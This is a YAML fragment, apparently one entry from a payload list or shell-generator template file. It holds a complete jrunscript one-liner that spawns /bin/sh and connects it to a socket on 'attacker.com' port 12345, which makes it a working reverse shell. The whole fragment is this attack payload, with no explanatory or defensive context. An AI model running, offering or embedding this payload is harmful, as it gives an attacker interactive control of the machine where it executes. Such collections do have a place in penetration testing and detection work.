- template: "jrunscript -e 'var host=\"attacker.com\";\n    var port=12345;\n    var p=new java.lang.ProcessBuilder(\"\
    /bin/sh\", \"-i\").redirectErrorStream(true).start();\n    var s=new java.net.Socket(host,port);\n\
    \    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\n\
    \    while(pi.available()>0)so.write(pi.read());\n    while(pe.available()>0)so.write(pe.read());\n\
    \    while(si.available()>0)po.write(si.read());\n    so.flush();po.flush();\n    java.lang.Thread.sleep(50);\n\
    \    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
